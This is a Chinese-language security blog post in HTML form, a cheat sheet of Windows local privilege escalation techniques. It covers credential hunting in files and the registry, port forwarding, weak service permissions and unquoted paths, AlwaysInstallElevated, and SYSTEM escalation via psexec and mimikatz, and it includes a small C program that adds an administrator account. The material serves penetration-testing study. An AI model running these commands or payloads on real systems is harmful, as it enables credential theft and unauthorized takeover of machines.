<!doctype html>




<html class="theme-next pisces" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<script>
    (function(){
        if(''){
            if (prompt('请输入文章密码') !== ''){
                alert('密码错误！');
                history.back(-1);
                <!--window.location.href='https://kevien.github.io'-->;
            }
        }
    })();
</script>







<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />





















<link href="/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="//main.css?v=" rel="stylesheet" type="text/css" />






  <link rel="alternate" href="/atom.xml" title="M0rk's Blog" type="application/atom+xml" />









<meta property="og:type" content="website">
<meta property="og:title" content="M0rk's Blog">
<meta property="og:url" content="http://kevien.github.io/page/3/index.html">
<meta property="og:site_name" content="M0rk's Blog">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="M0rk's Blog">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    sidebar: "",
    fancybox: ,
    motion: ,
    duoshuo: {
      userId: 'undefined',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: "",
      labels: ""
    }
  };
</script>







  <title> M0rk's Blog -  </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  














  
  

  <div class="container  
   page-home 
 ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">M0rk's Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/10/01/windows权限提升(二)/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="M0rk">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/uploads/avatar.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="M0rk's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                
                <a class="post-title-link" href="/2017/10/01/windows权限提升(二)/" itemprop="url">
                  windows权限提升(二)
                </a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            

            

            
          </span>

          

          
            
          

          
          

          

          

          
          
        </div>
      </header>
    

    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p><img src="/2017/10/01/windows权限提升(二)/windowsprivilegeescalation.png" alt=""></p>
<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul>
<li>A privilege is the right of an account, such as a user or group account, to perform various system-related operations on the local computer, such as shutting down the system, loading device drivers, or changing the system time” (msdn.microsoft.com)</li>
<li>首先来说说windows权限提升对于攻击者来说有哪些好处<br>1.可以尝试更多的攻击手法<br>2.可以获取到本地用户的哈希<br>3.可以在网络层进行LLMNR、NBNS投毒等<br>4.本地抓包<br>5.安装软件<br>6.可以从内存中获取明文的认证信息</li>
<li>当然本篇文章只是有关单台windows的提权，提权有时还包含内环境的情况，就是从一个普通域用户提权到域管理员用户，这种情况暂不在本文讨论范畴。</li>
<li>20200208更新-发现好笔记一处,比我的文章全。。。<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="external">Windows - Privilege Escalation</a><h2 id="基本系统信息枚举"><a href="#基本系统信息枚举" class="headerlink" title="基本系统信息枚举"></a>基本系统信息枚举</h2></li>
<li>在提权之前我们首先需要对这个系统需要有一定的了解，比如需要知道当前用户有哪些权限、系统打了哪些补丁等信息。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line"># Basics</div><div class="line">systeminfo</div><div class="line">hostname</div><div class="line"></div><div class="line"># Who am I?</div><div class="line">whoami</div><div class="line">echo %username%</div><div class="line"></div><div class="line"># What users/localgroups are on the machine?</div><div class="line">net users</div><div class="line">net localgroups</div><div class="line"></div><div class="line"># More info about a specific user. Check if user has privileges.</div><div class="line">net user user1</div><div class="line"></div><div class="line"># View Domain Groups</div><div class="line">net group /domain</div><div class="line"></div><div class="line"># View Members of Domain Group</div><div class="line">net group /domain &lt;Group Name&gt;</div><div class="line"></div><div class="line"># Firewall</div><div class="line">netsh firewall show state</div><div class="line">netsh firewall show config</div><div class="line"></div><div class="line"># Network</div><div class="line">ipconfig /all</div><div class="line">route print</div><div class="line">arp -A</div><div class="line"></div><div class="line"># How well patched is the system?</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</div><div class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB..&quot; /C:&quot;KB..&quot; - to find specific KBs</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="明文密码存储"><a href="#明文密码存储" class="headerlink" title="明文密码存储"></a>明文密码存储</h2><h3 id="通过以下的命令进行查找"><a href="#通过以下的命令进行查找" class="headerlink" title="通过以下的命令进行查找"></a>通过以下的命令进行查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">findstr /si password *.txt</div><div class="line">findstr /si password *.xml</div><div class="line">findstr /si password *.ini</div><div class="line"></div><div class="line">#Find all those strings in config files.</div><div class="line">dir /s *pass* == *cred* == *vnc* == *.config*</div><div class="line"></div><div class="line"># Find all passwords in all files.</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line">findstr /spin &quot;password&quot; *.*</div><div class="line"></div><div class="line"># Find Browser Creds</div><div class="line">enum_ie,enum_chrome(metasploit)</div><div class="line"></div><div class="line"># SessionGopher - find Putty,winscp,RDP creds</div><div class="line">[SessionGopher](https://github.com/Arvanaghi/SessionGopher)</div></pre></td></tr></table></figure>
<h3 id="关键文件查找"><a href="#关键文件查找" class="headerlink" title="关键文件查找"></a>关键文件查找</h3><ul>
<li>在这些常见的文件中查找，其中有些可能是base64编码的。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">c:\users\xxx\Desktop\password.xls</div><div class="line">c:\sysprep.inf</div><div class="line">c:\sysprep\sysprep.xml</div><div class="line">c:\unattend.xml</div><div class="line">%WINDIR%\Panther\Unattend\Unattended.xml</div><div class="line">%WINDIR%\Panther\Unattended.xml</div><div class="line"></div><div class="line">dir c:\*vnc.ini /s /b</div><div class="line">dir c:\*ultravnc.ini /s /b </div><div class="line">dir c:\ /s /b | findstr /si *vnc.ini</div><div class="line">此外还有可能是域环境中的group policy文件</div><div class="line">C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml • \\????\SYSVOL\\Policies\????\Machine\Preferences\Groups\Groups.xml</div><div class="line">![](grouppolicyfile.png)</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="注册表查找"><a href="#注册表查找" class="headerlink" title="注册表查找"></a>注册表查找</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># Windows autologin</div><div class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultUsername</div><div class="line">reg query &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot; /v DefaultPassword</div><div class="line"></div><div class="line"># SNMP Paramters</div><div class="line">reg query &quot;HKLM\SYSTEM\Current\ControlSet\Services\SNMP&quot;</div><div class="line"></div><div class="line"># Putty</div><div class="line">reg query &quot;HKCU\Software\SimonTatham\PuTTY\Sessions&quot;</div><div class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42</div><div class="line">-v ProxyUsername</div><div class="line">reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42</div><div class="line">-v ProxyPassword</div><div class="line"></div><div class="line">#vnc</div><div class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v Password</div><div class="line">reg query HKEY_CURRENT_USER\Software\TightVNC\Server /v PasswordViewOnly</div><div class="line"></div><div class="line"># Search for password in registry</div><div class="line">reg query HKLM /f password /t REG_SZ /s</div><div class="line">reg query HKCU /f password /t REG_SZ /s</div></pre></td></tr></table></figure>
<h2 id="仅对内网提供的服务"><a href="#仅对内网提供的服务" class="headerlink" title="仅对内网提供的服务"></a>仅对内网提供的服务</h2><ul>
<li><p>有时候一些服务只是允许内网用户访问，例如一个mysql服务器为了安全不允许外部进行连接。此外一些拥有高权限的程序往往也是针对内网的网络设备。例如打印机接口等。这些服务服务往往是容易存在漏洞的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">netstat -ano</div></pre></td></tr></table></figure>
</li>
<li><p>可能输出如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">Proto  Local address      Remote address     State        User  Inode  PID/Program name</div><div class="line">    -----  -------------      --------------     -----        ----  -----  ----------------</div><div class="line">    tcp    0.0.0.0:21         0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:5900       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    0.0.0.0:6532       0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    192.168.1.9:139    192.168.1.9:32874  TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:445    192.168.1.9:40648  ESTABLISHED  0     0      -</div><div class="line">    tcp    192.168.1.9:1166   192.168.1.9:139    TIME_WAIT    0     0      -</div><div class="line">    tcp    192.168.1.9:27900  0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    tcp    127.0.0.1:445      127.0.0.1:1159     ESTABLISHED  0     0      -</div><div class="line">    tcp    127.0.0.1:27900    0.0.0.0:*          LISTEN       0     0      -</div><div class="line">    udp    0.0.0.0:135        0.0.0.0:*                       0     0      -</div><div class="line">    udp    192.168.1.9:500    0.0.0.0:*                       0     0      -</div></pre></td></tr></table></figure>
</li>
<li><p>注意监听的端口，对比一下你从外网扫描到的结果，这里面有没有是你外网访问不到的？</p>
</li>
<li><p>如果是这样的，你可以通过端口转发来连接它。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># Port forward using plink</div><div class="line">plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080</div><div class="line"></div><div class="line"># Port forward using meterpreter</div><div class="line">portfwd add -l &lt;attacker port&gt; -p &lt;victim port&gt; -r &lt;victim ip&gt;</div><div class="line">portfwd add -l 3306 -p 3306 -r 192.168.1.101</div></pre></td></tr></table></figure>
</li>
<li><p>来看一下netstat命令的输出</p>
<h3 id="本地地址-0-0-0-0"><a href="#本地地址-0-0-0-0" class="headerlink" title="本地地址 0.0.0.0"></a>本地地址 0.0.0.0</h3></li>
<li>本地地址0.0.0.0意味着这个服务监听所有的接口，这个意味着所有人都可以连接。<h3 id="本地地址-127-0-0-1"><a href="#本地地址-127-0-0-1" class="headerlink" title="本地地址 127.0.0.1"></a>本地地址 127.0.0.1</h3></li>
<li>本地地址127.0.0.1意味着只能接受本台pc的连接，不允许任何其它地方的连接。<h3 id="本地地址-192-168-1-9"><a href="#本地地址-192-168-1-9" class="headerlink" title="本地地址 192.168.1.9"></a>本地地址 192.168.1.9</h3></li>
<li>本地地址192.168.1.9意味着只是监听来自本地网络的连接，所以只有本地的网络可以连接它，外网是不能连接的。<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2></li>
<li><p>通过如下的命令查看计划任务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">schtasks /query /fo LIST /v</div></pre></td></tr></table></figure>
</li>
<li><p>这个输出可能会很多，这个时候可以通过使用findstr命令进行一下过滤，我往往是将其粘贴到txt文档中，然后通过linux命令进行查找。虽然不是很优雅，但是能解决问题，你也可以修改SYSTEM为其它的高权限用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat schtask.txt | grep &quot;SYSTEM\|Task To Run&quot; | grep -B 1 SYSTEM</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="脆弱的服务权限"><a href="#脆弱的服务权限" class="headerlink" title="脆弱的服务权限"></a>脆弱的服务权限</h2><ul>
<li>服务是windows上没有图形化界面运行在后台的程序。如果你发现一个服务允许everyone写，那么你可以将你的二进制文件写到这个目录并让它去执行。</li>
<li>首先我们可以使用wmic或者sc.exe去发现服务，wmic并不是每台windows机器上都有，且有可能对你当前的用户不可用，如果你用不了它，你可以使用sc.exe<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">accesschk.exe -uwcqv &quot;Authenticated Users&quot; * /accepteula</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2017/10/01/windows权限提升(二)/servicedllhijack.png" alt=""></p>
<ul>
<li>服务程序路径每个人均可修改<br><img src="/2017/10/01/windows权限提升(二)/binpath.png" alt=""></li>
<li><p>2019年12月9日更新，工具<a href="https://github.com/antonioCoco/RogueWinRM" target="_blank" rel="external">RogueWinRM</a><br><a href="https://www.youtube.com/watch?v=9s8jYwx9FSA&amp;list=PLjG9EfEtwbvIrGFTx4XctK8IxkUJkAEqP&amp;index=4&amp;t=0s" target="_blank" rel="external">link</a></p>
<h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service list brief</div></pre></td></tr></table></figure>
</li>
<li><p>这个命令将会输出当前机器所运行的服务，这个时候我们需要找到这些有权限漏洞的服务，为了检查权限问题我们可以使用icacls这个命令，注意这个命令从vista才开始支持，xp或者以下用的是cacls命令。</p>
</li>
<li>如下的命令用于查看运行文件在非system32目录下的服务，并且使用icacls查看对应的权限。前提是你能够使用wmic，且你在c:\windows\temp目录有些权限。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">for /f &quot;tokens=2 delims=&apos;=&apos;&quot; %a in (&apos;wmic service list full^|find /i &quot;pathname&quot;^|find /i /v &quot;system32&quot;&apos;) do @echo %a &gt;&gt; c:\windows\temp\permissions.txt</div><div class="line"></div><div class="line">for /f eol^=^&quot;^ delims^=^&quot; %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls &quot;%a&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2017/10/01/windows权限提升(二)/wmic.png" alt=""></p>
<ul>
<li><p>system32目录被排除了，因为他们大多是正确的，一般都是系统创建的。</p>
<h3 id="sc-exe"><a href="#sc-exe" class="headerlink" title="sc.exe"></a>sc.exe</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">sc query state= all | findstr &quot;SERVICE_NAME:&quot; &gt;&gt; Servicenames.txt</div><div class="line"></div><div class="line">FOR /F %i in (Servicenames.txt) DO echo %i</div><div class="line">type Servicenames.txt</div><div class="line"></div><div class="line">FOR /F &quot;tokens=2 delims= &quot; %i in (Servicenames.txt) DO @echo %i &gt;&gt; services.txt</div><div class="line"></div><div class="line">FOR /F %i in (services.txt) DO @sc qc %i | findstr &quot;BINARY_PATH_NAME&quot; &gt;&gt; path.txt</div></pre></td></tr></table></figure>
</li>
<li><p>现在你就可以使用cacls命令来逐个查看每个文件权限了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cacls &quot;C:\path\to\file.exe&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="查看脆弱点"><a href="#查看脆弱点" class="headerlink" title="查看脆弱点"></a>查看脆弱点</h3><ul>
<li><p>我们需要关注的是用户安装的二进制文件，而不是系统自带的，而且我们想要找的是这样权限的 BUILTIN\Users:(F) ，就是内建用户拥有所有权限的，或者是user/usergroup有F或者C权限的。<br>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">C:\path\to\file.exe </div><div class="line">BUILTIN\Users:F</div><div class="line">BUILTIN\Power Users:C </div><div class="line">BUILTIN\Administrators:F </div><div class="line">NT AUTHORITY\SYSTEM:F</div></pre></td></tr></table></figure>
</li>
<li><p>这就意味着你当前用户拥有写权限，这个时候你可以重命名这个exe程序，然后将你的恶意程序放在这个目录下。最后重启这个程序，你的恶意程序就会被执行。这个恶意程序可以使用msfvenom来实现反弹shell或者获取最高权限。</p>
</li>
<li><p>下面的poc用于创建一个管理员组的用户</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">int main ()</div><div class="line">&#123;</div><div class="line">int i;</div><div class="line">    i = system(&quot;net localgroup administrators theusername /add&quot;);</div><div class="line">return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>然后我们可以使用mingw编译它</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="重启服务"><a href="#重启服务" class="headerlink" title="重启服务"></a>重启服务</h3><ul>
<li>现在我们需要重启服务来让我们的“恶意”程序得以执行，我们可以使用wmic命令或者net命令：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic service NAMEOFSERVICE call startservice</div></pre></td></tr></table></figure>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">net stop [service name] &amp;&amp; net start [service name].</div></pre></td></tr></table></figure>
<ul>
<li>这个时候你的二进制文件就会以system或者以管理员上下文进行执行。<h3 id="移植你的meterpreter-shell"><a href="#移植你的meterpreter-shell" class="headerlink" title="移植你的meterpreter shell"></a>移植你的meterpreter shell</h3></li>
<li>如果你的meterpreter 会话不稳定这个时候你可以迁移到一个稳定的服务上，例如移植到winlogon这个服务上，这个服务是以system权限运行的，且一般是一直运行的。我们可以使用如下的命令查看winlogon的PID<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wmic process list brief | find &quot;winlogon&quot;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>这个是有可以使用 migrate pid 进行转移。<br><strong>这里有个很好的例子！！！</strong><a href="https://medium.com/@bondo.mike/ptp-lab-privilege-escalation-with-services-5d14a99a28d1" target="_blank" rel="external">PTP Lab — Privilege Escalation with Services</a></p>
<h2 id="没有加双引号的服务路径"><a href="#没有加双引号的服务路径" class="headerlink" title="没有加双引号的服务路径"></a>没有加双引号的服务路径</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"># Using WMIC</div><div class="line">wmic service get name,displayname,pathname,startmode |findstr /i &quot;auto&quot; |findstr /i /v &quot;c:\windows\\&quot; |findstr /i /v &quot;&quot;&quot;</div><div class="line"></div><div class="line"># Using sc</div><div class="line">sc query</div><div class="line">sc qc service name</div><div class="line"></div><div class="line"># Look for Binary_path_name and see if it is unquoted.</div></pre></td></tr></table></figure>
<ul>
<li>如果路径包含了空格且没有被双引号闭合，那么这个服务是容易受攻击的。<br><img src="/2017/10/01/windows权限提升(二)/unquoted.png" alt=""><br><a href="https://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">更多</a><br><a href="https://www.youtube.com/watch?v=G9yn3qNq7Vw" target="_blank" rel="external">更多1</a><h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3></li>
<li><p>如果可执行文件的路径是这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\Program Files\something\winamp.exe</div></pre></td></tr></table></figure>
</li>
<li><p>我们可以放如下的程序在这里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c:\program.exe</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当服务重启的时候将会执行program.exe,我们可以利用任何有空格的目录，不仅仅是program files目录。</p>
<ul>
<li>更多的攻击技巧可以看这里：<br><a href="http://toshellandback.com/2015/11/24/ms-priv-esc/" target="_blank" rel="external">http://toshellandback.com/2015/11/24/ms-priv-esc/</a><br>metasploit 也有这个模块  exploit/windows/local/trusted_service_path<h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h2></li>
<li><p>AlwaysInstallElevated是一个策略设置。微软允许非授权用户以SYSTEM权限运行安装文件(MSI)，默认是没有配置的(即无法利用的)。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div><div class="line">reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</div></pre></td></tr></table></figure>
</li>
<li><p>这个配置错误的不多，更多可以看向这里<a href="https://xz.aliyun.com/t/203" target="_blank" rel="external">https://xz.aliyun.com/t/203</a><br><img src="/2017/10/01/windows权限提升(二)/AlwaysInstallElevated.png" alt=""><br><img src="/2017/10/01/windows权限提升(二)/backdoor.png" alt=""></p>
<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2></li>
<li>如果一个机器是加入域了的，当前用户可以查看系统信息卷，这里可能有敏感的文件。</li>
<li><p>首先我们需要装载这个卷，为了查找到域控机器的ip地址，我们先看一下环境变量。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"># Output environment-variables</div><div class="line">set</div><div class="line"></div><div class="line"># Look for the following:</div><div class="line">LOGONSERVER=\\NAMEOFSERVER</div><div class="line">USERDNSDOMAIN=WHATEVER.LOCAL</div><div class="line"></div><div class="line"># Look up ip-addres</div><div class="line">nslookup nameofserver.whatever.local</div><div class="line"></div><div class="line"># It will output something like this</div><div class="line">Address:  192.168.1.101</div><div class="line"></div><div class="line"># Now we mount it</div><div class="line">net use z: \\192.168.1.101\SYSVOL</div><div class="line"></div><div class="line"># And enter it</div><div class="line">z:</div><div class="line"></div><div class="line"># Now we search for the groups.xml file</div><div class="line">dir Groups.xml /s</div></pre></td></tr></table></figure>
</li>
<li><p>如果发现有password，我们可以使用kali中的工具进行解密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gpp-decrypt encryptedpassword</div></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="从admin到system权限"><a href="#从admin到system权限" class="headerlink" title="从admin到system权限"></a>从admin到system权限</h2><ul>
<li>有些时候需要用到system权限，例如操作注册表HKEY_LOCAL_MACHINE\SAM\SAM，以下总结一下从admin权限到system权限的技巧。<h3 id="xp和xp之前"><a href="#xp和xp之前" class="headerlink" title="xp和xp之前"></a>xp和xp之前</h3></li>
<li>如果你是一个有GUI界面的管理员组用户，如果你直接打开cmd.exe的时候，你只是以普通用户运行的这个程序，而当你右键以管理员身份运行你需要知道管理员密码。你可能没有管理员密码，这个时候你可以去c:\windows\system32 目录去运行cmd.exe 程序。</li>
<li><p>我们想要成为system 用户，还需要做以下的工作：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">time</div><div class="line"># Now we set the time we want the system CMD to start. Probably one minuter after the time.</div><div class="line">at 01:23 /interactive cmd.exe</div></pre></td></tr></table></figure>
</li>
<li><p>然后system权限的cmd就出现了。</p>
<h3 id="vista之后或者更新的系统"><a href="#vista之后或者更新的系统" class="headerlink" title="vista之后或者更新的系统"></a>vista之后或者更新的系统</h3></li>
<li>你首先需要上传一个psexec.exe 然后运行如下的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">psexec -i -s cmd.exe</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2017/10/01/windows权限提升(二)/psexec-admintosystem.png" alt=""></p>
<h3 id="创建服务的方式"><a href="#创建服务的方式" class="headerlink" title="创建服务的方式"></a>创建服务的方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sc create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</div></pre></td></tr></table></figure>
<p><img src="/2017/10/01/windows权限提升(二)/sc-admintosystem.png" alt=""></p>
<h3 id="使用metasploit"><a href="#使用metasploit" class="headerlink" title="使用metasploit"></a>使用metasploit</h3><ul>
<li>如果你有个metasploit的meterpreter的会话，直接运行getsystem就可以</li>
<li>xpn专门写了篇文章分析了getsystem中使用的技术<br><img src="/2017/10/01/windows权限提升(二)/xpn-admintosystem.jpg" alt=""><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/" target="_blank" rel="external">referer</a><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">privilege::debug</div><div class="line">token::whoami</div><div class="line">token::elevate</div><div class="line">lsadump::sam</div></pre></td></tr></table></figure>
</li>
</ul>
